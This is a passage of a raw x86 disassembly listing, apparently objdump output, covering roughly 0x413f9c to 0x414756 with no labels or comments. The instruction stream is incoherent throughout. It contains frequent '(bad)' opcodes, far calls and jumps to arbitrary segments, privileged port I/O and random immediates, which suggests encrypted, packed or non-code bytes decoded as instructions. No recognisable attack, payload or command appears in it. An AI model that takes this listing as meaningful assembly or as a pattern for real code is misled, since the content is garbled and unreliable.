  413f9c:	and    DWORD PTR [edi],esp
  413f9e:	test   al,cl
  413fa0:	xchg   BYTE PTR [eax+0x2c92af86],dl
  413fa6:	fisttp QWORD PTR [eax+0x32]
  413fa9:	retf   
  413faa:	jno    0x413f2f
  413fac:	ret    0x45e6
  413faf:	dec    edi
  413fb0:	cmp    esi,DWORD PTR [edi-0x4cdb1efd]
  413fb6:	call   0xdb1e:0x5fd7fc58
  413fbd:	xchg   edi,eax
  413fbe:	out    0x72,al
  413fc0:	cmc    
  413fc1:	sub    al,0x57
  413fc3:	adc    al,0xe8
  413fc5:	fnstsw WORD PTR [ecx-0x68]
  413fc8:	or     eax,0xf74e08ba
  413fcd:	leave  
  413fce:	cmp    al,0xf9
  413fd0:	mov    edx,0xaca6e4
  413fd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fd6:	ret    0x7eee
  413fd9:	pop    edi
  413fda:	jle    0x413f5d
  413fdc:	or     ch,BYTE PTR [edi+0x2fffb323]
  413fe2:	mov    esp,0x1dc81c44
  413fe7:	(bad)  
  413fe9:	arpl   WORD PTR [ebx+ebx*8],sp
  413fec:	add    esi,eax
  413fee:	ins    DWORD PTR es:[edi],dx
  413fef:	jg     0x413ff6
  413ff1:	out    dx,al
  413ff2:	in     al,dx
  413ff3:	lods   eax,DWORD PTR ds:[esi]
  413ff4:	mov    esp,0x9235859b
  413ff9:	xchg   esp,eax
  413ffa:	xchg   edi,eax
  413ffb:	(bad)  [esi+0x1a]
  413ffe:	les    ecx,FWORD PTR [ebx]
  414000:	push   esp
  414001:	pushf  
  414002:	xor    ebp,esp
  414004:	mov    ah,0x55
  414006:	test   BYTE PTR [ecx],ah
  414008:	rcl    DWORD PTR [esi-0x49],1
  41400b:	xchg   edi,eax
  41400c:	push   es
  41400d:	dec    esi
  41400e:	test   BYTE PTR [ecx-0x58],cl
  414011:	cmp    eax,0xf2de1516
  414016:	add    eax,0xf6384bd9
  41401b:	inc    eax
  41401c:	int    0xf3
  41401e:	push   ds
  41401f:	push   ecx
  414020:	sub    bl,BYTE PTR [eax]
  414022:	jecxz  0x413fe3
  414024:	push   ss
  414025:	ror    BYTE PTR [esi+0x4ff3a765],cl
  41402b:	xchg   ecx,eax
  41402c:	mov    al,0xac
  41402e:	(bad)  
  41402f:	cmp    BYTE PTR [edi+0x169a1ea9],al
  414035:	ffreep st(3)
  414037:	icebp  
  414038:	mov    ebx,0xaaa4c993
  41403d:	xchg   ecx,eax
  41403e:	add    BYTE PTR [edx+0x18],ah
  414041:	cmp    ebx,DWORD PTR [ebx]
  414043:	push   ss
  414044:	add    al,0xa7
  414046:	inc    esp
  414047:	neg    BYTE PTR [ebx]
  414049:	int    0xf7
  41404b:	mov    esi,0x3963445c
  414050:	dec    ebx
  414051:	push   eax
  414052:	cmp    BYTE PTR [edi],ah
  414054:	jb     0x4140cd
  414056:	sahf   
  414057:	mov    esp,0xf384e393
  41405c:	stos   DWORD PTR es:[edi],eax
  41405d:	pop    ebx
  41405e:	inc    ebp
  41405f:	sub    ecx,eax
  414061:	xchg   ebp,eax
  414062:	adc    esp,ebx
  414064:	fnstsw WORD PTR [ebp-0x5f]
  414067:	aam    0x2f
  414069:	mov    al,ds:0x4b3a79d3
  41406e:	daa    
  41406f:	test   BYTE PTR ds:0x16ae6e68,al
  414075:	mov    dh,0xdb
  414077:	sub    bh,dh
  414079:	xchg   esi,eax
  41407a:	imul   ecx,DWORD PTR [ebx-0x6a],0xffffffad
  41407e:	push   esi
  41407f:	mov    DWORD PTR [esi+edx*4+0x1f2f5650],esp
  414086:	mov    esp,0xf33e0399
  41408b:	sbb    edi,esp
  41408d:	push   ds
  41408e:	xor    BYTE PTR [ebx+0x3ef1fb1a],bh
  414094:	icebp  
  414095:	data16 outs dx,BYTE PTR ds:[esi]
  414097:	(bad)  
  414098:	loope  0x41403d
  41409a:	mov    ch,BYTE PTR [edx]
  41409c:	and    eax,0x1593b75c
  4140a1:	cmc    
  4140a2:	pop    edx
  4140a3:	in     eax,dx
  4140a4:	pop    ss
  4140a5:	mov    BYTE PTR [ebx-0x6e],bh
  4140a8:	and    cl,BYTE PTR [edx+0x468634cd]
  4140ae:	xor    ah,BYTE PTR [edi]
  4140b0:	aad    0x10
  4140b2:	(bad)  
  4140b3:	outs   dx,DWORD PTR ds:[esi]
  4140b4:	addr16 cmp al,0xf2
  4140b7:	pop    esp
  4140b8:	in     al,0xc2
  4140ba:	sti    
  4140bb:	mov    edi,0xe66913ac
  4140c0:	mov    DWORD PTR [eax],edx
  4140c2:	xchg   esi,eax
  4140c3:	cld    
  4140c4:	(bad)  
  4140c5:	pop    esi
  4140c6:	stos   BYTE PTR es:[edi],al
  4140c7:	push   0x2d
  4140c9:	sbb    eax,0x5dd81e92
  4140ce:	push   cs
  4140cf:	retf   0xa913
  4140d2:	mov    ch,0x12
  4140d4:	push   eax
  4140d5:	mov    al,ds:0x4eb9605c
  4140da:	and    ebx,eax
  4140dc:	and    BYTE PTR [esi],0xaf
  4140df:	mov    esp,0x53193cee
  4140e4:	sub    DWORD PTR [ecx-0x1de36172],0x6c
  4140eb:	mov    ebx,DWORD PTR [edx-0x1c0a0156]
  4140f1:	lods   al,BYTE PTR ds:[esi]
  4140f2:	call   0x16fb:0x8d9ab235
  4140f9:	ins    BYTE PTR es:[edi],dx
  4140fa:	aaa    
  4140fb:	stos   DWORD PTR es:[edi],eax
  4140fc:	or     BYTE PTR [ecx+ecx*8],dh
  4140ff:	aas    
  414100:	or     DWORD PTR [ebx+0x66],ebx
  414103:	jmp    0x82c4:0xfd26f0fa
  41410a:	pop    ds
  41410b:	sbb    eax,0x51de7806
  414110:	jecxz  0x414139
  414112:	sbb    bh,BYTE PTR [esi+0xae16db8]
  414118:	add    ebp,eax
  41411a:	loopne 0x414153
  41411c:	adc    eax,0x82455426
  414121:	ja     0x4140d1
  414123:	out    0x96,eax
  414125:	(bad)  
  414127:	sbb    DWORD PTR [edi-0x5e],esi
  41412a:	dec    ebp
  41412b:	das    
  41412c:	adc    bl,dh
  41412e:	dec    ebx
  41412f:	hlt    
  414130:	fsubr  st(2),st
  414132:	mov    ecx,0x4fe7cf49
  414137:	and    ch,dl
  414139:	lea    edi,[ebx+0x4a91d190]
  41413f:	test   al,0xe1
  414141:	jb     0x4140d7
  414143:	add    al,0x74
  414145:	inc    edi
  414146:	das    
  414147:	push   ecx
  414148:	out    dx,al
  414149:	xor    DWORD PTR [edx+0x2d],edi
  41414c:	inc    edi
  41414d:	adc    ebp,ebp
  41414f:	xchg   edx,eax
  414150:	pop    esp
  414151:	ja     0x41413c
  414153:	and    al,0x1e
  414155:	jmp    0x46ab:0x393442e7
  41415c:	push   ecx
  41415d:	retf   0x9e13
  414160:	lahf   
  414161:	add    BYTE PTR [edi+0x68],ch
  414164:	gs xor esi,edx
  414167:	push   eax
  414168:	and    eax,0xa95d0438
  41416d:	inc    edx
  41416e:	mov    ds:0xc7ec9dc,eax
  414173:	ds and al,0x8d
  414176:	add    DWORD PTR [eax+0x6d],0xffffff80
  41417a:	ja     0x41410c
  41417c:	push   ebp
  41417d:	loope  0x414192
  41417f:	jg     0x41414b
  414181:	pop    ds
  414182:	mov    ebx,es
  414184:	push   edx
  414185:	cmp    BYTE PTR [ecx],ch
  414187:	add    eax,0x618f92c8
  41418c:	xchg   ecx,eax
  41418d:	jmp    0x41420a
  41418f:	add    edx,esp
  414191:	push   ebx
  414192:	lea    ecx,[ebx-0x4b]
  414195:	dec    edi
  414196:	inc    esp
  414197:	dec    edi
  414198:	push   ebx
  414199:	(bad)  
  41419a:	dec    edi
  41419b:	stos   BYTE PTR es:[edi],al
  41419c:	push   0xc366532e
  4141a1:	loope  0x4141f1
  4141a3:	xor    al,0x44
  4141a5:	or     BYTE PTR [eax],bh
  4141a7:	imul   eax,DWORD PTR es:[edi-0x7def251d]
  4141af:	mov    dl,0x40
  4141b1:	xor    cl,BYTE PTR [eax+0x48]
  4141b4:	push   ds
  4141b5:	cmp    edi,DWORD PTR [eax]
  4141b7:	popa   
  4141b8:	pop    ss
  4141b9:	pop    edx
  4141ba:	add    cl,BYTE PTR [ebp-0x72]
  4141bd:	sbb    edi,edx
  4141bf:	mov    ah,0xe6
  4141c1:	imul   edx,ebx,0x5392c58c
  4141c7:	mov    esi,ebx
  4141c9:	stos   DWORD PTR es:[edi],eax
  4141ca:	adc    edi,DWORD PTR [eax-0x45]
  4141cd:	and    DWORD PTR [ecx+0x3373d8d],edi
  4141d3:	imul   edi,DWORD PTR [edi+ebx*4+0x5],0x34602c25
  4141db:	mov    ebp,0xfc5ccb7e
  4141e0:	vptestmw k6{k6},ymm2,QWORD PTR [edx-0x1d8]{1to4}
  4141e7:	(bad)  
  4141e8:	int    0xb2
  4141ea:	push   eax
  4141eb:	fist   WORD PTR [edx+0x1f68de0b]
  4141f1:	lds    ebp,FWORD PTR [ebp+ecx*8-0x1]
  4141f5:	test   eax,0x5a4be068
  4141fa:	dec    eax
  4141fb:	jnp    0x4141d4
  4141fd:	jb     0x4141ac
  4141ff:	daa    
  414200:	inc    eax
  414201:	and    BYTE PTR [ecx],cl
  414203:	sti    
  414204:	xchg   DWORD PTR [ebp+0xc],ecx
  414207:	orps   xmm2,XMMWORD PTR [ecx]
  41420a:	in     al,0xd4
  41420c:	enter  0xac3e,0x45
  414210:	fisttp DWORD PTR [ecx-0x2c53c0aa]
  414216:	out    0x20,eax
  414218:	xchg   ebp,eax
  414219:	xchg   ecx,eax
  41421a:	inc    esp
  41421b:	xchg   ebx,eax
  41421c:	orps   xmm5,XMMWORD PTR [ecx]
  41421f:	or     DWORD PTR [edx+0xe25ed99],edx
  414225:	in     eax,0x24
  414227:	out    0xca,eax
  414229:	in     al,0x28
  41422b:	cmp    bh,al
  41422d:	xchg   esp,eax
  41422e:	pop    ebp
  41422f:	dec    edx
  414230:	fisub  DWORD PTR [edi-0x62100ca8]
  414236:	sbb    edi,edi
  414238:	das    
  414239:	mov    DWORD PTR [esi-0x2a],ebp
  41423c:	push   esi
  41423d:	mov    esi,0x135956c4
  414242:	in     al,dx
  414243:	icebp  
  414244:	mov    esp,0xab64e9c7
  414249:	adc    eax,0x382fef4b
  41424e:	jmp    0xa8d3:0xee70c74d
  414255:	xchg   DWORD PTR [ebx-0x66f70111],esi
  41425b:	fist   DWORD PTR [edx]
  41425d:	mov    ah,0x31
  41425f:	pop    esp
  414260:	rcr    BYTE PTR [esi],1
  414262:	dec    ecx
  414263:	cmp    esi,DWORD PTR [ebp-0x55f41ac6]
  414269:	gs cmp al,0x39
  41426c:	xor    eax,0xb5fa0e06
  414271:	mov    bh,0xc
  414273:	mov    bh,0x57
  414275:	inc    edi
  414276:	outs   dx,DWORD PTR ds:[esi]
  414277:	push   edx
  414278:	pop    edx
  414279:	(bad)  
  41427a:	push   esp
  41427b:	xchg   esi,eax
  41427c:	adc    ebp,eax
  41427e:	pop    ss
  41427f:	xchg   ecx,eax
  414280:	popa   
  414281:	pop    edx
  414282:	xor    BYTE PTR ds:0x24f86964,bh
  414288:	test   ebp,edi
  41428a:	hlt    
  41428b:	nop
  41428c:	sti    
  41428d:	(bad)  
  41428e:	pop    esp
  41428f:	jle    0x4142f4
  414291:	sahf   
  414292:	inc    ebx
  414293:	push   0xf
  414295:	icebp  
  414296:	scas   al,BYTE PTR es:[edi]
  414297:	call   0xdb9e9ff0
  41429c:	(bad)  
  41429d:	fisttp WORD PTR [edx]
  41429f:	mov    ds:0x7130705c,eax
  4142a4:	mov    ch,0xe
  4142a6:	jnp    0x414284
  4142a8:	sub    DWORD PTR [ebx],0x10
  4142ab:	or     eax,0x648ca492
  4142b0:	(bad)  
  4142b2:	xor    DWORD PTR [ebx],ebx
  4142b4:	stc    
  4142b5:	neg    BYTE PTR [ebx+eax*2+0x695cf247]
  4142bc:	clc    
  4142bd:	add    DWORD PTR [edx+0x14ae0908],0xffffff87
  4142c4:	loopne 0x4142ce
  4142c6:	or     eax,0x93278e61
  4142cb:	aas    
  4142cc:	adc    DWORD PTR [edi],ecx
  4142ce:	es repz repz mov esi,0x282fc53e
  4142d6:	add    cl,BYTE PTR [ecx+0x20]
  4142d9:	adc    BYTE PTR [edx+0x602fecf5],0xd6
  4142e0:	pop    ds
  4142e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142e2:	inc    edi
  4142e3:	popa   
  4142e4:	mov    es,WORD PTR [eax+ebx*2]
  4142e7:	xor    al,0x92
  4142e9:	sbb    eax,0xefa4cc77
  4142ee:	xchg   ecx,eax
  4142ef:	dec    esp
  4142f0:	pop    ecx
  4142f1:	pop    ss
  4142f2:	push   esi
  4142f3:	fsub   st(6),st
  4142f5:	cwde   
  4142f6:	xchg   esi,eax
  4142f7:	adc    DWORD PTR [ebp+0x1a],eax
  4142fa:	xchg   BYTE PTR [ecx],bl
  4142fc:	mov    ebx,0x8294ec7f
  414301:	loop   0x4142de
  414303:	sar    al,1
  414305:	arpl   WORD PTR [eax],si
  414307:	ds (bad) 
  414309:	push   esp
  41430a:	pop    es
  41430b:	scas   al,BYTE PTR es:[edi]
  41430c:	and    DWORD PTR [eax-0x3e7e2a3e],0x87a1cec7
  414316:	jae    0x4142c0
  414318:	push   ecx
  414319:	jns    0x41431c
  41431b:	mov    ss,WORD PTR [edx+0x15498292]
  414321:	cli    
  414322:	test   BYTE PTR [edx+0x71],0x5f
  414326:	addr16 sahf 
  414328:	and    al,0x46
  41432a:	imul   edi,DWORD PTR [ebx+0x22],0xdc58d2ea
  414331:	sub    dl,ah
  414333:	in     al,0xcb
  414335:	jno    0x41432c
  414337:	or     DWORD PTR [ebx-0x21],ebp
  41433a:	xor    bh,BYTE PTR [ebx+eax*1]
  41433d:	in     al,0xfa
  41433f:	jge    0x4142e5
  414341:	iret   
  414342:	inc    eax
  414343:	sub    bl,BYTE PTR [ecx]
  414345:	push   es
  414346:	sub    eax,0x1f511598
  41434b:	mov    ebx,edx
  41434d:	xchg   BYTE PTR [edi+ecx*8],dh
  414350:	xor    BYTE PTR [ecx-0x77],dl
  414353:	lock push esi
  414355:	mov    ?,WORD PTR [edi+0x30c979e]
  41435b:	dec    eax
  41435c:	test   al,0x92
  41435e:	loop   0x4143cb
  414360:	(bad)  
  414361:	pop    ebx
  414362:	test   al,0xa3
  414364:	rcl    BYTE PTR [ebx+0x52f0e35a],cl
  41436a:	and    dh,BYTE PTR [edx+esi*8+0x44]
  41436e:	sub    BYTE PTR [edx+0x7923878f],cl
  414374:	or     edi,DWORD PTR ds:[edx]
  414377:	cs jecxz 0x414398
  41437a:	lds    edi,FWORD PTR [ebx]
  41437c:	out    0xe5,eax
  41437e:	ret    0x7806
  414381:	cli    
  414382:	mov    ds:0x21ee1764,al
  414387:	adc    eax,esp
  414389:	sub    eax,DWORD PTR [edi]
  41438b:	sub    BYTE PTR [edx],al
  41438d:	shl    DWORD PTR [edi+edi*2+0x39778078],0xf
  414395:	not    BYTE PTR [ebx]
  414397:	inc    ebp
  414398:	and    DWORD PTR [esp+eiz*4+0x690b4af6],ebx
  41439f:	sub    DWORD PTR [ebx+ecx*1-0x76],ebx
  4143a3:	push   edi
  4143a4:	mov    ch,0xe9
  4143a6:	fsubr  DWORD PTR [ebx+0x55ee09ea]
  4143ac:	scas   eax,DWORD PTR es:[edi]
  4143ad:	jb     0x41439b
  4143af:	dec    ebx
  4143b0:	jmp    0xa609:0xc80849bd
  4143b7:	pusha  
  4143b8:	fsub   QWORD PTR [esp+edi*8+0x656b2b0a]
  4143bf:	in     al,0x23
  4143c1:	inc    esp
  4143c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143c3:	or     BYTE PTR ds:0x65703a6e,0x22
  4143ca:	mov    esp,0xd4d280ee
  4143cf:	xchg   esi,eax
  4143d0:	mov    dh,0x1d
  4143d2:	stos   DWORD PTR es:[edi],eax
  4143d3:	das    
  4143d4:	mov    al,bh
  4143d6:	or     al,0xcf
  4143d8:	pop    ebp
  4143d9:	leave  
  4143da:	stos   DWORD PTR es:[edi],eax
  4143db:	iret   
  4143dc:	ss xchg esi,eax
  4143de:	jb     0x4143a4
  4143e0:	int3   
  4143e1:	push   edi
  4143e2:	mov    DWORD PTR [ebp-0x54c36293],0x41b0fb59
  4143ec:	int    0x76
  4143ee:	jbe    0x4143f9
  4143f0:	(bad)  
  4143f1:	(bad)  
  4143f2:	stos   DWORD PTR es:[edi],eax
  4143f3:	es jge 0x414462
  4143f6:	mov    ch,0xbb
  4143f8:	xchg   DWORD PTR [esi+0x19],eax
  4143fb:	popf   
  4143fc:	cmp    BYTE PTR [ebx+0x113d64c5],dl
  414402:	fstp   QWORD PTR [ecx-0x8a17226]
  414408:	outs   dx,DWORD PTR ds:[esi]
  414409:	fwait
  41440a:	or     esi,DWORD PTR [eax]
  41440c:	dec    eax
  41440d:	cli    
  41440e:	inc    esp
  41440f:	sbb    DWORD PTR [ebx-0x17],esp
  414412:	inc    edi
  414413:	push   cs
  414414:	mov    ecx,DWORD PTR [ebx-0x4aeb556a]
  41441a:	aam    0xba
  41441c:	xchg   ecx,eax
  41441d:	enter  0x6193,0xe5
  414421:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414422:	loopne 0x41449c
  414424:	mov    al,0xfd
  414426:	mov    ah,0x3f
  414428:	int3   
  414429:	jbe    0x41448a
  41442b:	push   ebp
  41442c:	mov    DWORD PTR [esi-0x26],esp
  41442f:	sub    DWORD PTR [eax-0x15f79c62],0x33
  414436:	push   0xffffffda
  414438:	ss or  al,0xb1
  41443b:	xor    DWORD PTR [bx+si],eax
  41443e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41443f:	dec    esp
  414440:	lods   eax,DWORD PTR ds:[esi]
  414441:	imul   esp
  414443:	cdq    
  414444:	push   esi
  414445:	jno    0x4143ff
  414447:	sbb    BYTE PTR [ebx-0xf],dl
  41444a:	das    
  41444b:	sbb    ebx,DWORD PTR [edx+0x240466e8]
  414451:	daa    
  414452:	mov    dl,0x19
  414454:	data16 xor BYTE PTR [esi-0x32ac3526],0x34
  41445c:	rol    DWORD PTR [ecx+0x66af33f0],1
  414462:	or     al,BYTE PTR [eax-0x3fc43a9a]
  414468:	jne    0x414436
  41446a:	shr    WORD PTR [ebp-0x6e],1
  41446e:	mov    WORD PTR [edx],?
  414470:	or     al,BYTE PTR [ebp+ebp*8+0x3c]
  414474:	adc    eax,0x837029e2
  414479:	int3   
  41447a:	add    edi,DWORD PTR [esi]
  41447c:	mov    eax,0x97fedfbc
  414481:	into   
  414482:	aam    0x58
  414484:	adc    al,0x41
  414486:	jo     0x41442b
  414488:	inc    ebx
  414489:	stc    
  41448a:	gs jg  0x414468
  41448d:	(bad)  
  41448e:	push   0xffffffda
  414490:	dec    esp
  414491:	add    al,0xc7
  414493:	mov    al,0xe2
  414495:	dec    edi
  414496:	push   ds
  414497:	ret    
  414498:	movzx  edi,BYTE PTR [esi+0x39]
  41449c:	xchg   DWORD PTR [ecx],edi
  41449e:	call   0xa905:0x83be4a3f
  4144a5:	fwait
  4144a6:	loop   0x41446c
  4144a8:	jle    0x41451f
  4144aa:	jb     0x4144d4
  4144ac:	scas   al,BYTE PTR es:[edi]
  4144ad:	inc    ebx
  4144ae:	into   
  4144af:	aad    0xd8
  4144b1:	(bad)  
  4144b2:	xlat   BYTE PTR ds:[ebx]
  4144b3:	or     ebx,DWORD PTR [ecx-0x58]
  4144b6:	shr    ebx,0xba
  4144b9:	mov    cl,0x55
  4144bb:	mov    ds:0x319cfd7,al
  4144c0:	imul   esp,DWORD PTR [ecx],0xa6b1b750
  4144c6:	cld    
  4144c7:	or     al,ah
  4144c9:	xor    eax,DWORD PTR [eax]
  4144cb:	cmp    eax,0x1fd27b97
  4144d0:	out    dx,eax
  4144d1:	shl    BYTE PTR ds:0xedc06c84,1
  4144d7:	jmp    DWORD PTR [ebx+edi*1+0x4f]
  4144db:	pop    edi
  4144dc:	pop    esi
  4144dd:	xor    al,0xcc
  4144df:	sub    BYTE PTR [esp+ebp*1-0x9eee824],al
  4144e6:	test   BYTE PTR [eax+ebx*8],0x85
  4144ea:	cmp    edi,DWORD PTR [ecx-0x7c]
  4144ed:	jno    0x41448a
  4144ef:	daa    
  4144f0:	jo     0x4144ae
  4144f2:	cli    
  4144f3:	xchg   DWORD PTR [esi],ecx
  4144f5:	ins    BYTE PTR es:[edi],dx
  4144f6:	pop    ds
  4144f7:	cmp    BYTE PTR [ebx],cl
  4144f9:	cmp    BYTE PTR [edx+0x14382312],ah
  4144ff:	mov    edx,0xb2a95739
  414504:	dec    edi
  414505:	aaa    
  414506:	fstp   DWORD PTR [eax+0x70b831a7]
  41450c:	sbb    al,BYTE PTR [eax+0x2c94a486]
  414512:	scas   al,BYTE PTR es:[edi]
  414513:	dec    ebp
  414514:	aaa    
  414515:	out    0x64,eax
  414517:	mov    dh,BYTE PTR [esi]
  414519:	mov    ebp,0x53a71b9
  41451e:	or     al,0xac
  414520:	xchg   edi,eax
  414521:	and    eax,0xcdea0b62
  414526:	mov    ebp,0xefbb4807
  41452b:	int3   
  41452c:	dec    esi
  41452d:	jle    0x4144e9
  41452f:	adc    cl,0x83
  414532:	mov    gs,WORD PTR [eax]
  414534:	jne    0x4144bb
  414536:	mov    DWORD PTR [eax-0x40],0xa41941b1
  41453d:	out    dx,al
  41453e:	xor    eax,0x3ae1c7d7
  414543:	inc    edx
  414544:	ror    BYTE PTR [edi+eax*1-0x1],1
  414548:	cdq    
  414549:	xchg   DWORD PTR [ecx+0xd],edi
  41454c:	mov    ch,0xad
  41454e:	stos   DWORD PTR es:[edi],eax
  41454f:	sub    ch,BYTE PTR [ecx]
  414551:	addr16 sti 
  414553:	pop    es
  414554:	inc    ebx
  414555:	mov    ds:0x296c873e,eax
  41455a:	scas   al,BYTE PTR es:[edi]
  41455b:	cs sahf 
  41455d:	jno    0x414547
  41455f:	dec    ecx
  414560:	xchg   esi,eax
  414561:	scas   eax,DWORD PTR es:[edi]
  414562:	aas    
  414563:	fmul   DWORD PTR [eax+0x7]
  414566:	fisttp DWORD PTR [edi-0x33]
  414569:	and    edx,DWORD PTR [esp+ebx*2+0x6b]
  41456d:	aam    0xbc
  41456f:	pusha  
  414570:	mov    bl,0xa2
  414572:	xchg   esi,eax
  414573:	std    
  414574:	mov    cl,0xcd
  414576:	out    dx,eax
  414577:	add    eax,0x72a95423
  41457c:	pop    esp
  41457d:	dec    ebx
  41457e:	push   0xe4ae291e
  414583:	scas   al,BYTE PTR es:[edi]
  414584:	jg     0x414536
  414586:	jmp    0x458:0x79288069
  41458d:	(bad)  
  41458f:	push   ss
  414590:	jmp    0x210e0564
  414595:	lahf   
  414596:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414597:	loopne 0x4145b1
  414599:	pop    ebx
  41459a:	stos   DWORD PTR es:[edi],eax
  41459b:	dec    edi
  41459c:	dec    ebx
  41459d:	sub    al,BYTE PTR [ebp+edi*2+0x2d579f75]
  4145a4:	mov    esi,0xf4bcd1a8
  4145a9:	jbe    0x41459c
  4145ab:	mov    edi,0xdef136a0
  4145b0:	mov    cl,0x7b
  4145b2:	int    0xdc
  4145b4:	jecxz  0x414539
  4145b6:	test   DWORD PTR [ecx+0x570c8c2b],0xf69f0c07
  4145c0:	jge    0x4145be
  4145c2:	(bad)  
  4145c3:	ret    0x993c
  4145c6:	mov    ds:0xc9158b08,al
  4145cb:	inc    ebp
  4145cc:	dec    edx
  4145cd:	inc    esi
  4145ce:	loopne 0x414550
  4145d0:	or     DWORD PTR [edi],ebx
  4145d2:	repz popa 
  4145d4:	push   es
  4145d5:	outs   dx,DWORD PTR ds:[esi]
  4145d6:	jb     0x41463d
  4145d8:	(bad)  
  4145d9:	dec    edx
  4145da:	lahf   
  4145db:	dec    eax
  4145dc:	lock xor ch,BYTE PTR cs:0xe237
  4145e3:	xor    al,0x67
  4145e5:	ret    
  4145e6:	mov    dh,0x80
  4145e8:	pop    edx
  4145e9:	cs ret 
  4145eb:	out    0xad,eax
  4145ed:	pop    ss
  4145ee:	dec    edi
  4145ef:	div    edx
  4145f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145f2:	mov    al,0xa5
  4145f4:	out    0x20,eax
  4145f6:	dec    eax
  4145f7:	or     DWORD PTR [esi+0x24b1f351],ebp
  4145fd:	mov    cl,BYTE PTR [ecx+edi*8]
  414600:	xor    eax,0xa7035e24
  414605:	and    esp,ebx
  414607:	pop    edx
  414608:	jle    0x4145ce
  41460a:	loop   0x414689
  41460c:	ds xchg ebp,eax
  41460e:	sbb    BYTE PTR [ebx+0x3d686411],cl
  414614:	and    BYTE PTR [edi+ebp*4-0x27],cl
  414618:	loope  0x414622
  41461a:	dec    esp
  41461b:	ficomp WORD PTR [ecx+0x29]
  41461e:	enter  0x2878,0x46
  414622:	push   edx
  414623:	mov    DWORD PTR [ebx],esi
  414625:	(bad)  
  414627:	xchg   esp,eax
  414628:	and    DWORD PTR [edx-0x1da4d01c],ebp
  41462e:	and    ebx,esi
  414630:	sub    BYTE PTR [ecx-0x27],0x62
  414634:	adc    ecx,DWORD PTR [ecx+eax*1+0xba0ebe9]
  41463b:	sub    BYTE PTR ds:0xfebd2dca,ch
  414641:	mov    eax,ds:0x24224c8c
  414646:	ds ins DWORD PTR es:[edi],dx
  414648:	xchg   BYTE PTR [ebx],bh
  41464a:	sar    DWORD PTR [ebx-0x367a33f0],1
  414650:	add    al,0xec
  414652:	dec    edi
  414653:	cs mov dh,0xef
  414656:	outs   dx,BYTE PTR ds:[esi]
  414657:	xchg   esp,eax
  414658:	pop    ebx
  414659:	inc    esp
  41465a:	push   cs
  41465b:	mov    al,ds:0x87b40b31
  414660:	outs   dx,DWORD PTR ds:[esi]
  414661:	arpl   WORD PTR [ebp-0x65673f1c],bp
  414667:	call   0x6533c50
  41466c:	xchg   esp,eax
  41466d:	xor    eax,0xea29b574
  414672:	xor    eax,0x189d86dd
  414677:	loop   0x41462a
  414679:	mov    cl,0x59
  41467b:	inc    esi
  41467c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41467d:	je     0x4146e8
  41467f:	stos   DWORD PTR es:[edi],eax
  414680:	pusha  
  414681:	test   DWORD PTR [edx+0x43],0x3bc4d4e
  414688:	imul   DWORD PTR [edx]
  41468a:	sbb    al,bh
  41468c:	cmc    
  41468d:	js     0x4146a1
  41468f:	outs   dx,BYTE PTR ds:[esi]
  414690:	xchg   ebp,eax
  414691:	mov    esi,0x18ee84c7
  414696:	jbe    0x414634
  414698:	sbb    DWORD PTR [edi+0x1f7559c0],esp
  41469e:	(bad)  
  41469f:	jge    0x4146b8
  4146a1:	(bad)  
  4146a3:	aas    
  4146a4:	cld    
  4146a5:	sti    
  4146a6:	rcr    ch,0x6f
  4146a9:	fs ins DWORD PTR es:[edi],dx
  4146ab:	sbb    BYTE PTR [edx],ah
  4146ad:	push   cs
  4146ae:	pop    es
  4146af:	adc    eax,0x4e6a46ce
  4146b4:	pop    ebx
  4146b5:	aam    0xab
  4146b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146b8:	mov    edi,0x93c208fd
  4146bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146be:	pop    esi
  4146bf:	mov    ah,0x8b
  4146c1:	cmp    ch,BYTE PTR [eax-0x2]
  4146c4:	cli    
  4146c5:	cdq    
  4146c6:	pop    ecx
  4146c7:	adc    eax,0xbc3e16f5
  4146cc:	scas   eax,DWORD PTR es:[edi]
  4146cd:	popfw  
  4146cf:	cmc    
  4146d0:	addr16 out dx,al
  4146d2:	sahf   
  4146d3:	dec    edi
  4146d4:	hlt    
  4146d5:	inc    ecx
  4146d6:	out    dx,eax
  4146d7:	rcl    DWORD PTR [edi+0x59373779],0x45
  4146de:	and    BYTE PTR [ebp-0x7b],dl
  4146e1:	leave  
  4146e2:	shl    DWORD PTR [esi+0x66],0xfe
  4146e6:	dec    edi
  4146e7:	mov    bl,0x21
  4146e9:	sbb    BYTE PTR [ebp+ebx*8+0x277c8cd6],ch
  4146f0:	adc    BYTE PTR [ecx+0xa7af831],al
  4146f6:	paddb  mm0,mm3
  4146f9:	(bad)  
  4146fa:	aad    0x6c
  4146fc:	xchg   ebp,eax
  4146fd:	sbb    ah,al
  4146ff:	in     eax,dx
  414700:	sti    
  414701:	out    0x72,al
  414703:	sbb    DWORD PTR [eax+0x5a],esp
  414706:	and    al,0xe2
  414708:	mov    ?,WORD PTR [esi+0x70]
  41470b:	jmp    0x1995:0xe91b58ec
  414712:	or     ecx,DWORD PTR [eax+0x67]
  414715:	aas    
  414716:	fwait
  414717:	jg     0x414746
  414719:	mov    dh,BYTE PTR [edi]
  41471b:	int    0x9f
  41471d:	scas   al,BYTE PTR es:[edi]
  41471e:	mov    dh,0x2d
  414720:	mov    bh,0x41
  414722:	sub    DWORD PTR [ebp+0x4d],ebx
  414725:	dec    eax
  414726:	rcl    DWORD PTR [ebx+0x3770396],cl
  41472c:	cmp    eax,0xa367018
  414731:	dec    ebp
  414732:	or     ch,BYTE PTR [edi-0x66]
  414735:	adc    DWORD PTR [edx+0x1d],esi
  414738:	stos   DWORD PTR es:[edi],eax
  414739:	xchg   ebp,eax
  41473a:	pop    ebx
  41473b:	cs sbb eax,0xdf36a332
  414741:	add    eax,0x4b747f60
  414746:	mov    esp,DWORD PTR [ecx-0x2c]
  414749:	pop    edi
  41474a:	sub    al,0xc5
  41474c:	push   eax
  41474d:	pop    eax
  41474e:	outs   dx,DWORD PTR ds:[esi]
  41474f:	inc    eax
  414750:	and    ebx,DWORD PTR [eax-0x6a8db906]
  414756:	mov    ds:0x3f08e22b,al
